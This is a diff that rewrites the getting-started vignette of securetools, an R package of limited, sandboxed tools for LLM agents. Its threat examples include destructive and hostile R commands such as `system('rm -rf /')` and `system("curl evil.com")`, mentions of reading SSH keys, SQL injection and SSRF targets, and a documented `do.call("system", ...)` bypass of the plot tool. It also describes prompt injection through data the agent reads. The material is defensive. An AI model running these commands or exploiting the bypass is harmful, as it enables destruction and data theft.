@@ -1,8 +1,8 @@
 ---
-title: "Getting Started with securetools"
+title: "Getting started with securetools"
 output: rmarkdown::html_vignette
 vignette: >
-  %\VignetteIndexEntry{Getting Started with securetools}
+  %\VignetteIndexEntry{Getting started with securetools}
   %\VignetteEngine{knitr::rmarkdown}
   %\VignetteEncoding{UTF-8}
 ---
@@ -15,40 +15,32 @@ knitr::opts_chunk$set(
 )
 ```
 
-## Why security-hardened tools?
+## Why tools need limits
 
-When you give an LLM agent access to tools, you hand executable
-capabilities to a system trained to be helpful, not safe.
-A model that can call `system()` can run arbitrary shell commands. A model
-with unrestricted file write can overwrite `/etc/passwd` or plant a reverse
-shell. Raw SQL access lets a model `DROP TABLE users` or exfiltrate
-every row from your production database.
+A tool you give an LLM agent is code the model can run whenever it decides
+to. If the model can call `system()`, it can run any shell command. If it
+can write files anywhere, it can overwrite something you care about. If it
+can send raw SQL, it can drop a table or read every row.
 
-These are not theoretical risks. Research on prompt injection and
-adversarial tool use has shown that LLM agents will follow
-carefully-crafted instructions embedded in untrusted data -- a user-uploaded
-CSV, a web page fetched by the agent, a crafted column name in a
-database result. If the tools have no safety
-boundaries, a single successful injection compromises the host system.
+The model doesn't have to be badly behaved for this to go wrong. Prompt
+injection works by hiding instructions in data the agent reads: a CSV it
+was asked to summarize, a web page it fetched, a column name in a query
+result. Agents often follow those instructions. If the tools have no
+limits, one successful injection is enough to do real damage.
 
-securetools provides pre-built tool definitions with
-structural security constraints. The tool physically
-cannot access files outside allowed directories. It accepts structured parameters and
-constructs parameterized queries internally. The agent never sees raw SQL,
-raw file paths outside the sandbox, or unrestricted HTTP access.
+securetools has ready-made tools for
+[securer](https://github.com/ian-flores/securer) with the limits built in.
+The file tools can't reach outside the folders you list. The SQL tool takes
+a table, columns, and a filter, and writes the query itself. The URL tool
+only talks to the domains you allow.
 
-## Overview
+Each `tool_*()` function returns a `securer::securer_tool()` object, which
+you pass to a `SecureSession`.
 
-securetools provides pre-built, security-hardened tool definitions for use
-with [securer](https://github.com/ian-flores/securer). Each tool factory
-returns a `securer::securer_tool()` object with built-in constraints: path
-scoping, parameterized SQL, domain allow-lists, size limits, and rate
-limiting.
+## How a tool call runs
 
-## How tool execution works
-
-Every securetools call follows the same execution flow. Validation
-happens in the parent process, which the sandbox cannot influence.
+Validation happens in your main R session (the parent process), not in
+the sandbox.
 
 ```
   LLM Agent                 Parent Process (R)              Sandbox (securer)
@@ -72,11 +64,10 @@ happens in the parent process, which the sandbox cannot influence.
       |<--- result/error ----------|                               |
 ```
 
-Validation runs in the parent process, which the
-sandboxed code cannot modify or bypass. Even if a sandbox escape were
-possible, the parent-level checks (path scoping, rate limits, SQL
-parameterization) still apply because they execute before the call
-reaches the sandbox.
+When code in the sandbox calls a tool, securer sends the call to the
+parent. The parent checks the arguments and, if they pass, runs the tool's
+function and sends the result back. Because both the checks and the tool
+itself run in the parent, code in the sandbox can't change or skip them.
 
 ## Installation
 
@@ -85,26 +76,22 @@ reaches the sandbox.
 pak::pak("ian-flores/securetools")
 ```
 
-## Quick example
+## The tools
 
 ```{r setup}
 library(securetools)
 library(securer)
 ```
 
-### Calculator tool
+### Calculator
 
-The threat: an LLM asked to "calculate" something might generate
-arbitrary R code instead of a simple arithmetic expression. Without
-validation, `calculator(expression = "system('rm -rf /')")` would
-execute a destructive shell command. Code injection through expression
-evaluation is a well-understood attack vector.
+If you hand a model a calculator that just evaluates R, nothing stops it
+from sending `calculator(expression = "system('rm -rf /')")`.
 
-The calculator tool evaluates mathematical expressions safely via AST
-validation. It parses the expression into an abstract syntax tree and
-walks every node, verifying that only arithmetic operators, math functions,
-and numeric literals are present. Variable access, assignment, and
-arbitrary function calls are all rejected before evaluation ever occurs.
+`tool_calculator()` parses the expression and walks the parse tree before
+running anything. Every function and name has to be on a short list of
+arithmetic and math functions. Variables, assignment, and any other
+function call are rejected, and nothing is evaluated.
 
 ```{r calculator}
 calc <- tool_calculator()
@@ -113,25 +100,26 @@ session <- SecureSession$new(tools = list(calc))
 session$execute('calculator(expression = "sqrt(144) + 2^3")')
 #> [1] 20
 
-# This is rejected; system() is not an allowed function:
+# Rejected: system() isn't on the list
 session$execute('calculator(expression = "system(\'whoami\')")')
-#> Error: Function not allowed in calculator: `system`
+#> Error: Function not allowed in calculator: `system()`
 
 session$close()
 ```
 
-### File I/O tools
+### Reading and writing files
 
-The threat: an agent with unrestricted file access can read secrets
-(`~/.ssh/id_rsa`, `.env` files, `/etc/shadow`) or write to sensitive
-locations. Path traversal attacks using `../../` sequences or symlinks
-let an attacker escape any intended directory. An agent might also
-exhaust disk space by writing extremely large files in a loop.
+An agent that can read any file can read `~/.ssh/id_rsa` or a `.env` file.
+One that can write anywhere can fill the disk or replace files outside the
+project. Paths like `../../` and symlinks are the usual ways out of a
+folder.
 
-File I/O tools enforce path scoping with symlink resolution, size limits,
-and directory allow-lists. Reading and writing are scoped independently
-so you can give an agent read access to source data without granting
-write access to the same directory:
+`tool_read_file()` and `tool_write_file()` take a list of allowed folders.
+Paths are resolved, symlinks included, before they're compared with that
+list. Both tools have a size limit, and the writer won't overwrite an
+existing file unless you set `overwrite = TRUE`. Reading and writing are
+set up separately, so you can let an agent read from one folder and write
+only to another.
 
 ```{r file-io}
 # Only allow access to a specific directory
@@ -170,20 +158,16 @@ session$execute('
 session$close()
 ```
 
-### SQL query tool
+### SQL queries
 
-The threat: SQL injection is a well-known attack class. An LLM given a raw
-SQL interface can be tricked (via prompt injection in user data or fetched
-content) into running `DROP TABLE`, `UNION SELECT` for data exfiltration, or
-`INSERT`/`UPDATE` to tamper with records. Parameterized
-queries help, but they still require the developer to use them correctly.
+If an agent can send raw SQL, a prompt injection can get it to run
+`DROP TABLE`, a `UNION SELECT` that pulls data from other tables, or an
+`UPDATE`. Parameterized queries help, but only when every query uses them
+correctly.
 
-securetools eliminates the attack surface entirely: the agent never writes SQL
-at all. The `tool_query_sql()` exposes a structured interface where
-the agent specifies a table name, column list, and optional filter.
-The tool constructs the SQL internally using parameterized queries.
-Injection is structurally impossible
-because the agent has no mechanism to supply raw SQL strings:
+`tool_query_sql()` doesn't take SQL at all. The agent names a table, the
+columns it wants, and an optional filter, and the tool builds the query.
+The filter value is sent as a query parameter, never pasted into the SQL:
 
 ```
   Agent Request                           Tool Internals
@@ -194,9 +178,10 @@ because the agent has no mechanism to supply raw SQL strings:
   filter_value = "1"                 [bound: "1"]
 ```
 
-The table and column names are validated against allow-lists. Only
-pre-approved tables can be queried, and column names are checked for
-SQL injection patterns before being interpolated into the query.
+The table has to be in `allowed_tables`. Column names aren't checked
+against a list, but they must be plain identifiers (letters, digits, and
+underscores), and table and column names are quoted with
+`DBI::dbQuoteIdentifier()`. Results are capped at `max_rows`.
 
 ```{r sql}
 library(DBI)
@@ -225,19 +210,25 @@ session$close()
 dbDisconnect(con)
 ```
 
-### URL fetch tool
+### Fetching URLs
 
-The threat: an agent with unrestricted HTTP access can perform
-Server-Side Request Forgery (SSRF), making requests to internal
-services (`http://169.254.169.254` for cloud metadata, `http://localhost:8080`
-for internal APIs) that are invisible from the public internet. It can
-also exfiltrate data by POSTing to attacker-controlled endpoints, or
-overwhelm external APIs with unbounded request loops.
+With open network access, an agent can reach services that aren't meant to
+be public, like a cloud metadata endpoint at `http://169.254.169.254` or an
+internal API on `http://localhost:8080`. This is server-side request
+forgery (SSRF). It can also send data out to a server an attacker controls,
+or hit an API in a loop.
 
-The URL fetch tool constrains network access with domain allow-lists
-(using glob patterns for subdomain matching), protocol restrictions
-(HTTP/HTTPS only), private IP blocking, response size limits, and
-rate limiting:
+`tool_fetch_url()` only allows GET and HEAD over HTTP or HTTPS. The host
+must match `allowed_domains`, where `*.example.com` matches any subdomain
+of `example.com` but not `example.com` itself. The tool looks up the host's
+IP address once, refuses private and loopback addresses (and all IPv6
+addresses), and then connects to that address so a second DNS answer can't
+send it somewhere else. It doesn't follow redirects, and it caps the
+response size and the number of calls per minute.
+
+HTTPS requests currently fail. Connecting by IP address breaks the TLS
+certificate check, so the example below errors until that is fixed. Plain
+HTTP works.
 
 ```{r fetch}
 fetcher <- tool_fetch_url(
@@ -257,14 +248,11 @@ session$execute('
 session$close()
 ```
 
-### Data profiling
+### Profiling data
 
-The threat: profiling enormous datasets without limits can exhaust
-memory and crash the host process. The `tool_data_profile()` enforces
-row limits through sampling, so multi-million-row data
-frames are summarized safely without consuming all available memory.
-
-Compute summary statistics for data frames:
+Summarizing a very large data frame can use a lot of memory.
+`tool_data_profile()` profiles a random sample of `max_rows` rows when the
+data is bigger than that, and says in its result that it sampled.
 
 ```{r profile}
 profiler <- tool_data_profile(max_rows = 100000)
@@ -278,17 +266,21 @@ session$execute('
 session$close()
 ```
 
-### Plot tool
+### Plots
 
-The threat: R's plotting system is powerful enough to execute
-arbitrary code. An expression like `plot(x); system("curl evil.com")` embeds
-a system call inside what looks like plotting code. Without restrictions,
-the plot tool becomes a general-purpose code execution backdoor.
+Plotting code is still R code. `plot(x); system("curl evil.com")` looks
+like a plot but also runs a shell command.
 
-The plot tool evaluates plot expressions in a restricted environment
-where only safe base R and graphics functions are available. Output
-is also path-scoped and size-limited to prevent writing oversized files
-to arbitrary locations:
+`tool_plot()` parses the code first and rejects any function that isn't on
+its list of graphics, math, and data functions. That check is weaker than
+it sounds; see the known limitations below. The plot is written to a
+temporary file, checked against `max_file_size`, and then copied to a path
+inside `allowed_dirs`.
+
+At the moment only `plot()` itself works. The code runs with only the base
+package visible, so functions from graphics such as `hist()`, `lines()`,
+and `barplot()` aren't found, and the example below fails until that is
+fixed.
 
 ```{r plot}
 plotter <- tool_plot(
@@ -303,21 +295,20 @@ session$execute('
     path = "/path/to/output/chart.png",
     plot_code = "hist(rnorm(1000), main = \"Distribution\")",
     width = 8,
-    height = 6
+    height = 6,
+    format = "auto"
   )
 ')
 
 session$close()
 ```
 
-### R help lookup
+### R help
 
-The threat: unrestricted documentation lookup might seem harmless,
-but it can leak information about installed packages and system
-configuration. The `allowed_packages` parameter restricts which packages
-can be queried, keeping the agent's awareness scoped to what you intend.
-
-The `tool_r_help()` gives safe access to R documentation:
+Looking up help pages seems harmless, but it tells the agent which
+packages you have installed. `tool_r_help()` only returns pages from the
+packages in `allowed_packages`, and cuts each page off at `max_lines`
+lines.
 
 ```{r r-help}
 help_tool <- tool_r_help(allowed_packages = c("base", "stats", "utils"))
@@ -325,65 +316,63 @@ help_tool <- tool_r_help(allowed_packages = c("base", "stats", "utils"))
 session <- SecureSession$new(tools = list(help_tool))
 
 # Look up documentation for a function
-result <- session$call("r_help", topic = "mean", package = "base")
+result <- session$execute('r_help(topic = "mean", package = "base")')
 cat(result)
 
 session$close()
 ```
 
-## Security model
+## What the tools protect against
 
-Every tool enforces constraints at the parent process level, not in
-the sandbox. This means even if the sandbox is somehow bypassed, tool-level
-protections still hold:
+The checks run in the parent process. Here is what each one is for:
 
-- Path scoping: symlinks are resolved before checking allowed directories
-- Parameterized SQL: structured interface prevents injection by design
-- Domain allow-lists: URL validation before any HTTP request
-- Size limits: checked after serialization (write) or before processing (read)
-- Rate limiting: per-tool lifetime and/or sliding window limits
-- AST validation: calculator expression safety via recursive AST walking
-
-## Security considerations
-
-### Threat model
-
-securetools protects against an untrusted LLM agent attempting to:
-
-- Read sensitive files: path validation with symlink resolution prevents directory traversal
-- Write to arbitrary locations: write paths are validated against allowed directories
-- Execute arbitrary code: calculator uses AST validation; plot tool restricts to plotting functions
-- Access internal services (SSRF): URL fetching validates protocols (HTTP/HTTPS only) and blocks private IPs
-- SQL injection: structured query interface with parameterized filters prevents raw SQL injection
-- Resource exhaustion: rate limiting and size limits constrain resource usage
+- Reading secret files: paths are resolved, symlinks included, and must
+  be inside an allowed folder.
+- Writing to the wrong place: write paths are checked the same way, and
+  checked again after the file is written.
+- Running arbitrary code: the calculator and plot tools reject functions
+  that aren't on their lists (the plot tool has a known gap, below).
+- Reaching internal services: the URL tool only allows HTTP and HTTPS,
+  allowed domains, and public IP addresses.
+- SQL injection: the agent never writes SQL, and filter values are
+  passed as parameters.
+- Runaway use: every tool has an optional call limit, and the file,
+  plot, and URL tools have size limits.
 
 ### Known limitations
 
-- TOCTOU races: between path validation and file I/O, a symlink could theoretically be swapped. Use `validate_written_path()` for post-write verification.
-- Rate limiting is per-process: limits reset if the R process restarts. For persistent rate limiting, use an external mechanism.
-- DNS rebinding: the private IP check resolves DNS before the request, but DNS rebinding attacks could bypass this.
-- Base R access in restricted environments: the plot tool's restricted environment still provides access to safe base R functions. The allowlist is comprehensive but may need updates for new R versions.
+- Between checking a path and writing to it, someone with access to the
+  folder could swap in a symlink. The write and plot tools check the path
+  again after writing and delete the file if it ended up outside the
+  allowed folders, but the write has already happened by then.
+- Call limits live in memory. They reset when the R process restarts. If
+  you need limits that last, enforce them outside R.
+- The plot tool is not safe for untrusted code yet. Its allow list
+  includes `do.call()`, and the code runs with base R visible, so
+  `do.call("system", list("ls"))` gets past the check and runs. Until this
+  is fixed, only use `tool_plot()` inside a sandboxed session.
+- `tool_fetch_url()` can't fetch HTTPS URLs yet (see above).
+- Passing a data frame the size of `iris` or `mtcars` to `data_profile()`
+  from inside a `SecureSession` currently fails while the data is sent
+  between processes. Small data frames work, and calling the tool directly
+  with `profiler@fn(iris)` works.
 
-### Working with SecureSession
+### Calling tools through a SecureSession
 
-When tools are called through `SecureSession` IPC, all tool arguments must be specified
-explicitly. The child process wrappers do not carry default values from the tool factory.
-For example, always specify `format = "auto"` even though it's the default in direct usage.
+Inside a `SecureSession`, the tool functions don't keep the default
+argument values from the factory. Pass every argument, even ones with a
+default like `format = "auto"`.
 
-## Rate limiting
+## Call limits
 
-Agent loops are unbounded by default. A ReAct agent keeps calling
-tools until it decides it has an answer or hits a token limit. Without
-rate limiting, a confused or manipulated agent could make
-thousands of API calls, exhaust disk I/O, or run up cloud costs. Rate
-limits impose a hard boundary independent of the LLM's
-decision-making.
+An agent loop keeps calling tools until the model decides it's done or
+runs out of tokens. A confused or manipulated agent can make thousands of
+calls. A call limit stops it no matter what the model decides.
 
-All tool factories accept `max_calls` for lifetime rate limiting. Some
-tools (like `tool_fetch_url()`) also support `max_calls_per_minute` for
-sliding-window throttling. When a limit is hit, the tool returns an
-error message to the LLM rather than silently failing, giving the
-agent a chance to adjust its strategy:
+Every tool takes `max_calls`, a limit on the total number of calls.
+`tool_fetch_url()` also takes `max_calls_per_minute`. When a limit is
+reached, the tool raises an error, and the agent can see that error and
+change course.
 
 ```{r rate-limit}
 # Allow only 100 calculator evaluations per session
@@ -391,20 +380,21 @@ calc <- tool_calculator(max_calls = 100)
 
 # URL fetch with both lifetime and per-minute limits
 fetcher <- tool_fetch_url(
+  allowed_domains = "api.github.com",
   max_calls = 1000,
   max_calls_per_minute = 10
 )
 ```
 
-## Available tools
+## All tools
 
-| Tool | Factory | Key Security Features |
-|------|---------|----------------------|
-| Calculator | `tool_calculator()` | AST validation, no code injection |
-| Data Profile | `tool_data_profile()` | Row sampling for large data |
-| Read File | `tool_read_file()` | Path scoping, size limits |
-| Write File | `tool_write_file()` | Path scoping, size limits, overwrite protection |
-| SQL Query | `tool_query_sql()` | Table allow-list, parameterized queries |
-| URL Fetch | `tool_fetch_url()` | Domain allow-list, rate limiting |
-| Plot | `tool_plot()` | Path scoping, output size limits |
-| R Help | `tool_r_help()` | Package allow-list |
+| Function | Limits |
+|---|---|
+| `tool_calculator()` | Allowed functions only; rejects anything else before evaluating |
+| `tool_data_profile()` | Samples rows from large data |
+| `tool_read_file()` | Allowed folders, size cap, row cap |
+| `tool_write_file()` | Allowed folders, size cap, no overwriting by default |
+| `tool_query_sql()` | Allowed tables, no raw SQL, parameterized filters |
+| `tool_fetch_url()` | Allowed domains, no private IPs, size cap, calls per minute |
+| `tool_plot()` | Allowed functions, allowed folders, size cap |
+| `tool_r_help()` | Allowed packages, line cap |
